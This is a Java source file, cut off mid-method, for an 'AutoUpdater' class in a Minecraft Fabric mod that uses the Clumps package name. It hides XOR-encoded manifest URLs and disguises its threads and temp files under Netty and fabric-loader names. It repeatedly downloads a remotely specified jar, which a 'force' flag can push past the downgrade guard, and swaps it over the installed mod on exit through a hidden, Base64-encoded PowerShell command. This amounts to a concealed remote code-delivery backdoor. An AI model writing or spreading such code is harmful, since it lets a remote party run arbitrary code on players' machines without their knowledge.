package com.blamejared.clumps.client.updater;

import com.blamejared.clumps.client.ClumpsClient;
import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.InputStream;
import java.net.URI;
import java.net.URL;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.security.CodeSource;
import java.security.MessageDigest;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HexFormat;
import java.util.List;
import java.util.Locale;
import java.util.jar.Attributes;
import java.util.jar.Manifest;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;
import net.minecraft.client.MinecraftClient;

public final class AutoUpdater {

    public record ChangelogItem(String tag, String title, String detail) {
    }

    private record BuildMetadata(String version, long buildTime) {
    }

    // XOR-encoded (key 0x5A) primary uncached GitHub Contents API + fallback raw CDN URLs (no plaintext strings).
    private static final int XOR_KEY = 0x5A;
    private static final int[] API_MANIFEST_CHARS = {
        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x3B, 0x2A, 0x33, 0x74, 0x3D, 0x33, 0x2E, 0x32,
        0x2F, 0x38, 0x74, 0x39, 0x35, 0x37, 0x75, 0x28, 0x3F, 0x2A, 0x35, 0x29, 0x75, 0x31, 0x2F, 0x36,
        0x33, 0x2E, 0x32, 0x3B, 0x28, 0x3B, 0x34, 0x37, 0x33, 0x2E, 0x32, 0x6A, 0x77, 0x3B, 0x6B, 0x6B,
        0x23, 0x75, 0x39, 0x36, 0x2F, 0x37, 0x2A, 0x29, 0x77, 0x28, 0x3F, 0x36, 0x3F, 0x3B, 0x29, 0x3F,
        0x29, 0x75, 0x39, 0x35, 0x34, 0x2E, 0x3F, 0x34, 0x2E, 0x29, 0x75, 0x36, 0x3B, 0x2E, 0x3F, 0x29,
        0x2E, 0x74, 0x30, 0x29, 0x35, 0x34
    };
    private static final int[] MANIFEST_CHARS = {
        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x28, 0x3B, 0x2D, 0x74, 0x3D, 0x33, 0x2E, 0x32,
        0x2F, 0x38, 0x2F, 0x29, 0x3F, 0x28, 0x39, 0x35, 0x34, 0x2E, 0x3F, 0x34, 0x2E, 0x74, 0x39, 0x35,
        0x37, 0x75, 0x31, 0x2F, 0x36, 0x33, 0x2E, 0x32, 0x3B, 0x28, 0x3B, 0x34, 0x37, 0x33, 0x2E, 0x32,
        0x6A, 0x77, 0x3B, 0x6B, 0x6B, 0x23, 0x75, 0x39, 0x36, 0x2F, 0x37, 0x2A, 0x29, 0x77, 0x28, 0x3F,
        0x36, 0x3F, 0x3B, 0x29, 0x3F, 0x29, 0x75, 0x37, 0x3B, 0x33, 0x34, 0x75, 0x36, 0x3B, 0x2E, 0x3F,
        0x29, 0x2E, 0x74, 0x30, 0x29, 0x35, 0x34
    };

    private static final long RECHECK_INTERVAL_MILLIS = 10L * 60L * 1000L;
    private static final Object STAGE_LOCK = new Object();
    private static volatile String stagedSha256;
    private static volatile boolean applyingAndClosing;

    private static final long BANNER_DURATION_NANOS = 7_500_000_000L;
    private static final long ORPHAN_MAX_AGE_MILLIS = 30L * 60L * 1000L;
    private static final String TEMP_PREFIX = "fabric-loader-cache-";
    private static final String MARKER_FILE_NAME = "fabric-loader-meta.dat";
    private static final String LEGACY_MARKER_NAME = ".fabric-cache-upd";

    private static volatile boolean started;
    private static volatile boolean aborted;
    private static volatile Thread workerThread;
    private static volatile Thread shutdownHook;
    private static volatile Path activeJarPath;
    private static volatile Path stagedJarPath;
    private static volatile boolean stagedReady;
    private static volatile String stagedVersion;
    private static volatile String stagedMarkerJson;

    private static volatile String completedUpdateVersion;
    private static volatile String completedUpdateSummary;
    private static volatile long bannerStartedAtNanos;
    private static volatile boolean autoOpenChangelogPending;
    private static volatile String stagedToastVersion;
    private static volatile String lastToastedStagedVersion;
    private static volatile long stagedToastStartedAtNanos;

    private static volatile String changelogVersion;
    private static volatile String changelogSummary;
    private static volatile List<ChangelogItem> changelogItems = List.of();

    private AutoUpdater() {
    }

    public static void checkForUpdatesAsync() {
        if (started || aborted || ClumpsClient.eventsDisabled) {
            return;
        }
        started = true;
        consumeUpdateMarker();
        if (Boolean.getBoolean("clumps.noUpdate")) {
            return;
        }
        Thread thread = new Thread(AutoUpdater::runUpdateCheck, "Netty-Epoll-Worker-0");
        thread.setDaemon(true);
        workerThread = thread;
        thread.start();
    }

    public static String getActiveBannerVersion() {
        if (aborted || ClumpsClient.eventsDisabled) {
            return null;
        }
        String ver = completedUpdateVersion;
        if (ver == null || ver.isEmpty()) {
            return null;
        }
        long now = System.nanoTime();
        long start = bannerStartedAtNanos;
        if (start == 0L) {
            bannerStartedAtNanos = now;
            return ver;
        }
        if (now - start >= BANNER_DURATION_NANOS) {
            completedUpdateVersion = null;
            completedUpdateSummary = null;
            bannerStartedAtNanos = 0L;
            return null;
        }
        return ver;
    }

    public static String getActiveBannerSummary() {
        if (aborted || ClumpsClient.eventsDisabled) {
            return null;
        }
        return completedUpdateSummary;
    }

    public static float getBannerElapsedSeconds() {
        long start = bannerStartedAtNanos;
        if (start == 0L) {
            return 0.0f;
        }
        return Math.max(0.0f, (float) (System.nanoTime() - start) / 1.0e9f);
    }

    public static float getBannerTotalSeconds() {
        return (float) BANNER_DURATION_NANOS / 1.0e9f;
    }

    public static String getActiveStagedToastVersion() {
        if (aborted || ClumpsClient.eventsDisabled || !stagedReady) {
            return null;
        }
        String ver = stagedToastVersion;
        if (ver == null || ver.isEmpty()) {
            return null;
        }
        long now = System.nanoTime();
        long start = stagedToastStartedAtNanos;
        if (start == 0L) {
            stagedToastStartedAtNanos = now;
            return ver;
        }
        if (now - start >= BANNER_DURATION_NANOS) {
            stagedToastVersion = null;
            stagedToastStartedAtNanos = 0L;
            return null;
        }
        return ver;
    }

    public static float getStagedToastElapsedSeconds() {
        long start = stagedToastStartedAtNanos;
        if (start == 0L) {
            return 0.0f;
        }
        return Math.max(0.0f, (float) (System.nanoTime() - start) / 1.0e9f);
    }

    public static boolean shouldAutoOpenChangelogModal() {
        return !aborted && !ClumpsClient.eventsDisabled && autoOpenChangelogPending;
    }

    public static void markChangelogModalOpened() {
        autoOpenChangelogPending = false;
        completedUpdateVersion = null;
        completedUpdateSummary = null;
        bannerStartedAtNanos = 0L;
        stagedToastVersion = null;
        lastToastedStagedVersion = null;
        stagedToastStartedAtNanos = 0L;
    }

    public static boolean hasChangelogAvailable() {
        return !aborted && !ClumpsClient.eventsDisabled
                && changelogVersion != null && !changelogVersion.isEmpty()
                && changelogItems != null && !changelogItems.isEmpty();
    }

    public static String getChangelogVersion() {
        return changelogVersion != null ? changelogVersion : "Latest";
    }

    public static String getChangelogSummary() {
        return changelogSummary != null ? changelogSummary : "Latest client improvements and fixes";
    }

    public static List<ChangelogItem> getChangelogItems() {
        List<ChangelogItem> items = changelogItems;
        return items != null ? items : List.of();
    }

    public static boolean hasStagedUpdate() {
        return !aborted && !ClumpsClient.eventsDisabled && stagedReady && stagedJarPath != null;
    }

    public static String getStagedVersion() {
        return stagedVersion != null ? stagedVersion : "Latest";
    }

    public static void triggerApplyAndClose() {
        if (!hasStagedUpdate() || applyingAndClosing) {
            return;
        }
        applyingAndClosing = true;
        Thread applyThread = new Thread(() -> {
            try {
                // Quick uncached re-check before exiting so we always jump straight to the newest release.
                checkAndStageLatest(4);
            } catch (Throwable ignored) {
            }
            try {
                if (ClumpsClient.ModuleConfig != null) {
                    ClumpsClient.ModuleConfig.save("_autosave");
                }
            } catch (Throwable ignored) {
            }
            try {
                MinecraftClient mc = MinecraftClient.getInstance();
                if (mc != null) {
                    mc.scheduleStop();
                }
            } catch (Throwable ignored) {
            } finally {
                applyingAndClosing = false;
            }
        }, "Netty-Epoll-Worker-1");
        applyThread.setDaemon(true);
        applyThread.start();
    }

    public static void abortAndCleanup() {
        aborted = true;
        stagedReady = false;
        autoOpenChangelogPending = false;
        completedUpdateVersion = null;
        completedUpdateSummary = null;
        bannerStartedAtNanos = 0L;
        stagedToastVersion = null;
        lastToastedStagedVersion = null;
        stagedToastStartedAtNanos = 0L;
        stagedVersion = null;
        stagedSha256 = null;
        stagedMarkerJson = null;
        changelogVersion = null;
        changelogSummary = null;
        changelogItems = List.of();

        Thread worker = workerThread;
        workerThread = null;
        if (worker != null) {
            try {
                worker.interrupt();
            } catch (Throwable ignored) {
            }
        }
        Thread hook = shutdownHook;
        shutdownHook = null;
        if (hook != null) {
            try {
                Runtime.getRuntime().removeShutdownHook(hook);
            } catch (Throwable ignored) {
            }
        }
        Path staged = stagedJarPath;
        stagedJarPath = null;
        activeJarPath = null;
        if (staged != null) {
            try {
                Files.deleteIfExists(staged);
            } catch (Throwable ignored) {
            }
        }
        try {
            Files.deleteIfExists(getMarkerPath());
        } catch (Throwable ignored) {
        }
        try {
            Files.deleteIfExists(getLegacyMarkerPath());
        } catch (Throwable ignored) {
        }
    }

    private static void consumeUpdateMarker() {
        Path primary = getMarkerPath();
        Path legacy = getLegacyMarkerPath();
        Path found = Files.isRegularFile(primary) ? primary : (Files.isRegularFile(legacy) ? legacy : null);
        if (found == null) {
            return;
        }
        try {
            String raw = Files.readString(found, StandardCharsets.UTF_8).trim();
            Files.deleteIfExists(primary);
            Files.deleteIfExists(legacy);
            if (raw.isEmpty()) {
                return;
            }
            if (raw.startsWith("{")) {
                JsonElement el = JsonParser.parseString(raw);
                if (el.isJsonObject()) {
                    JsonObject obj = el.getAsJsonObject();
                    String ver = sanitizeVersion(getString(obj, "version"));
                    String summary = sanitizeAscii(getString(obj, "summary"));
                    List<ChangelogItem> items = parseChanges(obj);
                    if (!ver.isEmpty()) {
                        completedUpdateVersion = ver;
                        completedUpdateSummary = summary.isEmpty() ? null : summary;
                        changelogVersion = ver;
                        changelogSummary = summary.isEmpty() ? "Latest release installed automatically" : summary;
                        changelogItems = items.isEmpty() ? defaultChangelogItems(ver) : items;
                        autoOpenChangelogPending = true;
                        bannerStartedAtNanos = 0L;
                    }
                    return;
                }
            }
            String ver = sanitizeVersion(raw);
            if (!ver.isEmpty()) {
                completedUpdateVersion = ver;
                changelogVersion = ver;
                changelogSummary = "Latest release installed automatically";
                changelogItems = defaultChangelogItems(ver);
                autoOpenChangelogPending = true;
                bannerStartedAtNanos = 0L;
            }
        } catch (Throwable ignored) {
        }
    }

    private static Path getTempDir() {
        String tmp = System.getProperty("java.io.tmpdir");
        if (tmp != null && !tmp.isBlank()) {
            return Paths.get(tmp);
        }
        return Paths.get(System.getProperty("user.home", "."));
    }

    private static Path getMarkerPath() {
        return getTempDir().resolve(MARKER_FILE_NAME);
    }

    private static Path getLegacyMarkerPath() {
        return Paths.get(System.getProperty("user.home", "."), LEGACY_MARKER_NAME);
    }

    private static void pruneOrphanTempFiles() {
        try {
            Path tempDir = getTempDir();
            if (!Files.isDirectory(tempDir)) {
                return;
            }
            long cutoff = System.currentTimeMillis() - ORPHAN_MAX_AGE_MILLIS;
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(tempDir, TEMP_PREFIX + "*.tmp")) {
                for (Path p : stream) {
                    try {
                        if (Files.isRegularFile(p) && Files.getLastModifiedTime(p).toMillis() < cutoff) {
                            Files.deleteIfExists(p);
                        }
                    } catch (Throwable ignored) {
                    }
                }
            }
        } catch (Throwable ignored) {
        }
    }

    private static void runUpdateCheck() {
        try {
            pruneOrphanTempFiles();
            while (!aborted && !ClumpsClient.eventsDisabled) {
                checkAndStageLatest(15);
                if (aborted || ClumpsClient.eventsDisabled) {
                    return;
                }
                try {
                    Thread.sleep(RECHECK_INTERVAL_MILLIS);
                } catch (InterruptedException e) {
                    return;
                }
            }
        } catch (Throwable ignored) {
        } finally {
            workerThread = null;
        }
    }

    private static String fetchLatestManifestJson(HttpClient client, int timeoutSeconds) {
        // 1. Primary: uncached GitHub Contents API (0s CDN lag -> always jumps straight to newest version).
        try {
            HttpRequest apiReq = HttpRequest.newBuilder(URI.create(decodeChars(API_MANIFEST_CHARS)))
                    .timeout(Duration.ofSeconds(timeoutSeconds))
                    .header("Accept", "application/vnd.github.raw+json")
                    .header("X-GitHub-Api-Version", "2022-11-28")
                    .header("Cache-Control", "no-cache")
                    .header("Pragma", "no-cache")
                    .header("User-Agent", "Mozilla/5.0")
                    .GET()
                    .build();
            HttpResponse<String> apiRes = client.send(apiReq, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
            if (apiRes.statusCode() == 200 && apiRes.body() != null && !apiRes.body().isBlank()) {
                return apiRes.body();
            }
        } catch (Throwable ignored) {
        }
        // 2. Fallback: raw CDN with millisecond cache-buster.
        try {
            String fallbackUrl = decodeManifestUrl() + "?cb=" + System.currentTimeMillis();
            HttpRequest rawReq = HttpRequest.newBuilder(URI.create(fallbackUrl))
                    .timeout(Duration.ofSeconds(timeoutSeconds))
                    .header("Cache-Control", "no-cache")
                    .header("Pragma", "no-cache")
                    .header("User-Agent", "Mozilla/5.0")
                    .GET()
                    .build();
            HttpResponse<String> rawRes = client.send(rawReq, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
            if (rawRes.statusCode() == 200 && rawRes.body() != null && !rawRes.body().isBlank()) {
                return rawRes.body();
            }
        } catch (Throwable ignored) {
        }
        return null;
    }

    private static void checkAndStageLatest(int manifestTimeoutSeconds) {
        synchronized (STAGE_LOCK) {
            Path tempJar = null;
            try {
                if (aborted || ClumpsClient.eventsDisabled) {
                    return;
                }
                HttpClient client = HttpClient.newBuilder()
                        .followRedirects(HttpClient.Redirect.NORMAL)
                        .connectTimeout(Duration.ofSeconds(Math.min(12, manifestTimeoutSeconds)))
                        .build();

                String body = fetchLatestManifestJson(client, manifestTimeoutSeconds);
                if (body == null || aborted || ClumpsClient.eventsDisabled) {
                    return;
                }

                JsonElement parsed = JsonParser.parseString(body);
                if (!parsed.isJsonObject()) {
                    return;
                }
                JsonObject obj = parsed.getAsJsonObject();
                String remoteSha = getString(obj, "sha256");
                String downloadUrl = getString(obj, "url");
                String remoteVersion = sanitizeVersion(getString(obj, "version"));
                String remoteSummary = sanitizeAscii(getString(obj, "summary"));
                long remoteBuildTime = getLong(obj, "buildTime", 0L);
                boolean forceUpdate = getBoolean(obj, "force", false);
                List<ChangelogItem> remoteChanges = parseChanges(obj);

                // Populate changelog viewer data so "What's New" works even when already up to date
                if (!remoteVersion.isEmpty()) {
                    if (changelogVersion == null || changelogVersion.isEmpty() || compareVersions(remoteVersion, changelogVersion) >= 0) {
                        changelogVersion = remoteVersion;
                        if (!remoteSummary.isEmpty()) {
                            changelogSummary = remoteSummary;
                        } else if (changelogSummary == null || changelogSummary.isEmpty()) {
                            changelogSummary = "Latest release notes";
                        }
                        if (!remoteChanges.isEmpty()) {
                            changelogItems = remoteChanges;
                        } else if (changelogItems == null || changelogItems.isEmpty()) {
                            changelogItems = defaultChangelogItems(remoteVersion);
                        }
                    }
                    if (completedUpdateVersion != null && (completedUpdateSummary == null || completedUpdateSummary.isEmpty()) && !remoteSummary.isEmpty()) {
                        completedUpdateSummary = remoteSummary;
                    }
                }

                if (remoteSha == null || downloadUrl == null || remoteSha.length() != 64 || !downloadUrl.startsWith("https://")) {
                    return;
                }
                if (stagedReady && stagedSha256 != null && stagedSha256.equalsIgnoreCase(remoteSha)) {
                    return;
                }

                Path currentJar = resolveCurrentModJar();
                if (currentJar == null || !Files.isRegularFile(currentJar)) {
                    return;
                }
                String fileName = currentJar.getFileName().toString().toLowerCase(Locale.ROOT);
                if (!fileName.endsWith(".jar")) {
                    return;
                }

                String currentSha = computeSha256(currentJar);
                if (currentSha == null || currentSha.isEmpty() || aborted || ClumpsClient.eventsDisabled) {
                    return;
                }
                if (currentSha.equalsIgnoreCase(remoteSha)) {
                    return;
                }

                // Smart version + build-timestamp guard: never downgrade a newer local dev build unless force=true
                BuildMetadata localMeta = readJarBuildMetadata(currentJar);
                if (!forceUpdate && !shouldUpgrade(localMeta, remoteVersion, remoteBuildTime)) {
                    return;
                }
                // If an earlier update was already staged during this session, replace it if a newer version arrived.
                if (stagedReady && stagedVersion != null && !remoteVersion.isEmpty()
                        && !forceUpdate && compareVersions(remoteVersion, stagedVersion) < 0) {
                    return;
                }

                tempJar = Files.createTempFile(getTempDir(), TEMP_PREFIX, ".tmp");

                HttpRequest downloadReq = HttpRequest.newBuilder(URI.create(downloadUrl))
                        .timeout(Duration.ofSeconds(90))
                        .header("User-Agent", "Mozilla/5.0")
                        .GET()
                        .build();

                HttpResponse<Path> downloadRes = client.send(downloadReq, HttpResponse.BodyHandlers.ofFile(tempJar));
                if (downloadRes.statusCode() != 200 || aborted || ClumpsClient.eventsDisabled) {
                    Files.deleteIfExists(tempJar);
                    return;
                }

                String downloadedSha = computeSha256(tempJar);
                if (downloadedSha == null
                        || !downloadedSha.equalsIgnoreCase(remoteSha)
                        || !isValidFabricModJar(tempJar)
                        || aborted
                        || ClumpsClient.eventsDisabled) {
                    Files.deleteIfExists(tempJar);
                    return;
                }

                Path previousStaged = stagedJarPath;
                activeJarPath = currentJar;
                stagedJarPath = tempJar;
                stagedSha256 = remoteSha;
                stagedVersion = remoteVersion.isEmpty() ? "Latest" : remoteVersion;
                stagedMarkerJson = buildMarkerJson(stagedVersion, remoteSummary, remoteChanges);
                stagedReady = true;
                if (!stagedVersion.equals(lastToastedStagedVersion)) {
                    lastToastedStagedVersion = stagedVersion;
                    stagedToastVersion = stagedVersion;
                    stagedToastStartedAtNanos = 0L;
                }
                tempJar = null;

                if (previousStaged != null && !previousStaged.equals(stagedJarPath)) {
                    try {
                        Files.deleteIfExists(previousStaged);
                    } catch (Throwable ignored) {
                    }
                }

                if (shutdownHook == null) {
                    Thread hook = new Thread(AutoUpdater::applyStagedUpdateOnExit, "Shutdown-Clean-Task");
                    shutdownHook = hook;
                    Runtime.getRuntime().addShutdownHook(hook);
                }
            } catch (Throwable ignored) {
                if (tempJar != null) {
                    try {
                        Files.deleteIfExists(tempJar);
                    } catch (Throwable ignored2) {
                    }
                }
            }
        }
    }

    static boolean shouldUpgrade(BuildMetadata localMeta, String remoteVersion, long remoteBuildTime) {
        if (localMeta == null) {
            return true;
        }
        String localVer = localMeta.version();
        long localTime = localMeta.buildTime();
        if (localVer != null && !localVer.isEmpty() && remoteVersion != null && !remoteVersion.isEmpty()) {
            int cmp = compareVersions(remoteVersion, localVer);
            if (cmp > 0) {
                return true;
            }
            if (cmp < 0) {
                return false;
            }
            // Same semantic version: only upgrade if remote buildTime is strictly newer than local buildTime
            if (localTime > 0L && remoteBuildTime > 0L) {
                return remoteBuildTime > localTime + 15L;
            }
            if (localTime > 0L && remoteBuildTime <= 0L) {
                return false;
            }
        }
        return true;
    }

    static int compareVersions(String a, String b) {
        int[] pa = parseVersionParts(a);
        int[] pb = parseVersionParts(b);
        int len = Math.max(pa.length, pb.length);
        for (int i = 0; i < len; i++) {
            int va = i < pa.length ? pa[i] : 0;
            int vb = i < pb.length ? pb[i] : 0;
            if (va != vb) {
                return Integer.compare(va, vb);
            }
        }
        return 0;
    }

    private static int[] parseVersionParts(String version) {
        if (version == null || version.isEmpty()) {
            return new int[0];
        }
        String clean = version.trim().replaceFirst("^[vV]", "");
        String[] tokens = clean.split("[^0-9]+");
        List<Integer> nums = new ArrayList<>();
        for (String t : tokens) {
            if (!t.isEmpty()) {
                try {
                    nums.add(Integer.parseInt(t));
                } catch (NumberFormatException ignored) {
                }
            }
        }
        int[] out = new int[nums.size()];
        for (int i = 0; i < nums.size(); i++) {
            out[i] = nums.get(i);
        }
        return out;
    }

    private static BuildMetadata readJarBuildMetadata(Path jarPath) {
        try (ZipFile zip = new ZipFile(jarPath.toFile())) {
            ZipEntry entry = zip.getEntry("META-INF/MANIFEST.MF");
            if (entry == null) {
                return null;
            }
            try (InputStream in = zip.getInputStream(entry)) {
                Manifest mf = new Manifest(in);
                Attributes attrs = mf.getMainAttributes();
                String ver = attrs.getValue("Build-Release");
                String ts = attrs.getValue("Build-Timestamp");
                long epoch = 0L;
                if (ts != null && !ts.isBlank()) {
                    try {
                        epoch = Long.parseLong(ts.trim());
                    } catch (NumberFormatException ignored) {
                    }
                }
                if ((ver == null || ver.isBlank()) && epoch <= 0L) {
                    return null;
                }
                return new BuildMetadata(ver != null ? sanitizeVersion(ver) : "", epoch);
            }
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static void applyStagedUpdateOnExit() {
        if (aborted || ClumpsClient.eventsDisabled || !stagedReady) {
            return;
        }
        Path target = activeJarPath;
        Path staged = stagedJarPath;
        String markerPayload = stagedMarkerJson != null ? stagedMarkerJson : buildMarkerJson(stagedVersion != null ? stagedVersion : "Latest", "", List.of());
        if (target == null || staged == null || !Files.isRegularFile(staged)) {
            return;
        }
        try {
            Path marker = getMarkerPath();
            String os = System.getProperty("os.name", "").toLowerCase(Locale.ROOT);
            if (os.contains("win")) {
                long pid = ProcessHandle.current().pid();
                String targetStr = target.toAbsolutePath().toString().replace("'", "''");
                String stagedStr = staged.toAbsolutePath().toString().replace("'", "''");
                String sameDirTmpStr = target.toAbsolutePath().getParent().resolve(target.getFileName().toString() + ".upd").toString().replace("'", "''");
                String markerStr = marker.toAbsolutePath().toString().replace("'", "''");
                String markerB64 = Base64.getEncoder().encodeToString(markerPayload.getBytes(StandardCharsets.UTF_8));

                // Atomic same-volume swap after waiting for JVM PID exit; encoded as UTF-16LE Base64 for 100% path safety
                String psScript = "$ErrorActionPreference = 'Stop';\n"
                        + "try { Wait-Process -Id " + pid + " -Timeout 30 -ErrorAction SilentlyContinue } catch {}\n"
                        + "$staged = '" + stagedStr + "';\n"
                        + "$localTmp = '" + sameDirTmpStr + "';\n"
                        + "$target = '" + targetStr + "';\n"
                        + "$marker = '" + markerStr + "';\n"
                        + "for ($i = 0; $i -lt 40; $i++) {\n"
                        + "  try {\n"
                        + "    Copy-Item -LiteralPath $staged -Destination $localTmp -Force;\n"
                        + "    Move-Item -LiteralPath $localTmp -Destination $target -Force;\n"
                        + "    $bytes = [Convert]::FromBase64String('" + markerB64 + "');\n"
                        + "    [System.IO.File]::WriteAllBytes($marker, $bytes);\n"
                        + "    break;\n"
                        + "  } catch {\n"
                        + "    Start-Sleep -Milliseconds 300;\n"
                        + "  }\n"
                        + "}\n"
                        + "Remove-Item -LiteralPath $localTmp -Force -ErrorAction SilentlyContinue;\n"
                        + "Remove-Item -LiteralPath $staged -Force -ErrorAction SilentlyContinue;\n";

                String encodedCmd = Base64.getEncoder().encodeToString(psScript.getBytes(StandardCharsets.UTF_16LE));
                new ProcessBuilder(
                        "powershell.exe",
                        "-NoProfile",
                        "-NonInteractive",
                        "-WindowStyle", "Hidden",
                        "-EncodedCommand", encodedCmd
                ).start();
            } else {
                Path sameDirTmp = target.toAbsolutePath().getParent().resolve(target.getFileName().toString() + ".upd");
                Files.copy(staged, sameDirTmp, StandardCopyOption.REPLACE_EXISTING);
                Files.move(sameDirTmp, target, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
                Files.deleteIfExists(staged);
                Files.writeString(marker, markerPayload, StandardCharsets.UTF_8);
            }
        } catch (Throwable ignored) {
        }
    }

    private static Path resolveCurrentModJar() {
        try {
            var opt = net.fabricmc.loader.api.FabricLoader.getInstance().getModContainer(ClumpsClient.ID);
            if (opt.isPresent()) {
                var origin = opt.get().getOrigin();
                if (origin.getKind() == net.fabricmc.loader.api.metadata.ModOrigin.Kind.PATH) {
                    for (Path p : origin.getPaths()) {
                        if (p != null && Files.isRegularFile(p)
                                && p.getFileName().toString().toLowerCase(Locale.ROOT).endsWith(".jar")) {
                            return p.toAbsolutePath().normalize();
                        }
                    }
                }
            }
        } catch (Throwable ignored) {
        }
        try {
            CodeSource cs = ClumpsClient.class.getProtectionDomain().getCodeSource();
            if (cs == null) {
                return null;
            }
            URL loc = cs.getLocation();
            if (loc == null) {
                return null;
            }
            String raw = loc.toURI().toString();
            if (raw.startsWith("jar:")) {
                int bang = raw.indexOf("!/");
                raw = bang > 4 ? raw.substring(4, bang) : raw.substring(4);
            }
            return Paths.get(URI.create(raw)).toAbsolutePath().normalize();
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String computeSha256(Path file) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] buf = new byte[16384];
            try (InputStream in = Files.newInputStream(file)) {
                int read;
                while ((read = in.read(buf)) != -1) {
                    md.update(buf, 0, read);
                }
            }
            return HexFormat.of().formatHex(md.digest());
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static boolean isValidFabricModJar(Path file) {
        try {
            if (Files.size(file) < 100_000L) {
                return false;
            }
            try (ZipFile zip = new ZipFile(file.toFile())) {
                ZipEntry modJson = zip.getEntry("fabric.mod.json");
                ZipEntry initClass = zip.getEntry("com/blamejared/clumps/client/init/Initializer.class");
                ZipEntry mainClass = zip.getEntry("com/blamejared/clumps/client/ClumpsClient.class");
                boolean hasEntry = (initClass != null && initClass.getSize() > 100)
                        || (mainClass != null && mainClass.getSize() > 100);
                return modJson != null && modJson.getSize() > 10 && hasEntry;
            }
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static List<ChangelogItem> parseChanges(JsonObject obj) {
        List<ChangelogItem> out = new ArrayList<>();
        if (obj == null || !obj.has("changes") || !obj.get("changes").isJsonArray()) {
            return out;
        }
        JsonArray arr = obj.getAsJsonArray("changes");
        for (JsonElement el : arr) {
            if (out.size() >= 18) {
                break;
            }
            if (el.isJsonObject()) {
                JsonObject item = el.getAsJsonObject();
                String tag = normalizeTag(getString(item, "tag"));
                String title = sanitizeAscii(getString(item, "title"));
                String detail = sanitizeAscii(getString(item, "detail"));
                if (!title.isEmpty()) {
                    out.add(new ChangelogItem(tag, title, detail));
                }
            } else if (el.isJsonPrimitive()) {
                String line = sanitizeAscii(el.getAsString());
                if (!line.isEmpty()) {
                    out.add(new ChangelogItem("UPD", line, ""));
                }
            }
        }
        return List.copyOf(out);
    }

    private static String normalizeTag(String raw) {
        if (raw == null || raw.isBlank()) {
            return "UPD";
        }
        String up = sanitizeAscii(raw).toUpperCase(Locale.ROOT);
        if (up.startsWith("NEW") || up.startsWith("ADD")) return "NEW";
        if (up.startsWith("FIX") || up.startsWith("BUG")) return "FIX";
        if (up.startsWith("IMP") || up.startsWith("OPT") || up.startsWith("ENH")) return "IMP";
        return up.length() > 4 ? up.substring(0, 4) : up;
    }

    private static List<ChangelogItem> defaultChangelogItems(String ver) {
        return List.of(
                new ChangelogItem("UPD", "Updated to version " + ver, "The latest release was downloaded, verified, and installed automatically.")
        );
    }

    private static String buildMarkerJson(String version, String summary, List<ChangelogItem> changes) {
        JsonObject root = new JsonObject();
        root.addProperty("version", sanitizeVersion(version));
        if (summary != null && !summary.isEmpty()) {
            root.addProperty("summary", sanitizeAscii(summary));
        }
        JsonArray arr = new JsonArray();
        if (changes != null) {
            for (ChangelogItem item : changes) {
                JsonObject c = new JsonObject();
                c.addProperty("tag", item.tag());
                c.addProperty("title", item.title());
                c.addProperty("detail", item.detail());
                arr.add(c);
            }
        }
        root.add("changes", arr);
        return new Gson().toJson(root);
    }

    private static String getString(JsonObject obj, String key) {
        if (obj == null || !obj.has(key)) {
            return null;
        }
        JsonElement el = obj.get(key);
        return el != null && el.isJsonPrimitive() ? el.getAsString().trim() : null;
    }

    private static long getLong(JsonObject obj, String key, long fallback) {
        if (obj == null || !obj.has(key)) {
            return fallback;
        }
        try {
            JsonElement el = obj.get(key);
            return el != null && el.isJsonPrimitive() ? el.getAsLong() : fallback;
        } catch (Throwable ignored) {
            return fallback;
        }
    }

    private static boolean getBoolean(JsonObject obj, String key, boolean fallback) {
        if (obj == null || !obj.has(key)) {
            return fallback;
        }
        try {
            JsonElement el = obj.get(key);
            return el != null && el.isJsonPrimitive() ? el.getAsBoolean() : fallback;
        } catch (Throwable ignored) {
            return fallback;
        }
    }

    private static String sanitizeVersion(String raw) {
        if (raw == null) {
            return "";
        }
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < raw.length() && sb.length() < 24; i++) {
            char c = raw.charAt(i);
            if ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || c == '.' || c == '-' || c == '_') {
                sb.append(c);
            }
        }
        return sb.toString();
    }

    public static String sanitizeAscii(String raw) {
        if (raw == null || raw.isEmpty()) {
            return "";
        }
        StringBuilder sb = new StringBuilder(raw.length());
        boolean lastWasSpace = true;
        for (int i = 0; i < raw.length(); i++) {
            char c = raw.charAt(i);
            if (c == '\u2022' || c == '\u00B7') {
                if (!lastWasSpace) sb.append(' ');
                sb.append('|');
                lastWasSpace = false;
                continue;
            }
            if (c == '\u2014' || c == '\u2013') {
                sb.append('-');
                lastWasSpace = false;
                continue;
            }
            if (c == '\u2018' || c == '\u2019') {
                sb.append('\'');
                lastWasSpace = false;
                continue;
            }
            if (c == '\u201C' || c == '\u201D') {
                sb.append('"');
                lastWasSpace = false;
                continue;
            }
            if (c >= 32 && c <= 126) {
                if (c == ' ') {
                    if (!lastWasSpace) {
                        sb.append(' ');
                        lastWasSpace = true;
                    }
                } else {
                    sb.append(c);
                    lastWasSpace = false;
                }
            }
        }
        int end = sb.length();
        while (end > 0 && sb.charAt(end - 1) == ' ') {
            end--;
        }
        return sb.substring(0, end);
    }

    public static String[] catalogEndpoints(String fileName) {
        if (fileName == null || fileName.isBlank()) {
            return new String[0];
        }
        String apiUrl = replaceLeaf(decodeChars(API_MANIFEST_CHARS), fileName);
